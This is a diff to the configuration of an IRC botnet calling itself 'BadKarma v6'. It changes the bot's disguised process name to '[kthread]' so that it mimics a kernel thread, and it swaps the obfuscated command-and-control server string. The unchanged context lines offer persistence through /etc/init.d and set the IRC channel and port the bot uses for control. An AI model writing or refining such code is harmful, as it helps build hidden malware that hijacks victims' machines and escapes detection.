@@ -80,7 +80,7 @@
 ////////////////////////////////////////////////////////////////////////////////
 #undef STARTUP			// Overwrite /etc/init.d and start on startup
 #undef IDENT			// IRC ident - Only enable this if you absolutely have to
-#define FAKENAME "bioset"	// Fork and change process name to this after launch
+#define FAKENAME "[kthread]"	// Fork and change process name to this after launch
 #define CHAN "#ziggy"	        // Channel to join
 #define KEY "null"		// The key of the channel (if not using encirc)
 #define PORT 6667  // The port that the ircd is listening on
@@ -94,7 +94,7 @@ char arch[] = "xXxXx";		// Target architecture of this build
 char botversion[] = "BadKarma v6 Feb 2017"; // Version of this bot
 int numservers=1;		// Must change this to equal number of servers down there
 char *servers[] = {		// List the servers in that format, always end in (void*)0
-	"$7?*$s7<F", // localhost (run ./hide -encode 'yourserver.com')
+	"m,@y@xZyZ@y@-", // localho:st (run ./hide -encode 'yourserver.com')
 	//"\")$$@yvuq$<yq\"",
         (void*)0
 };
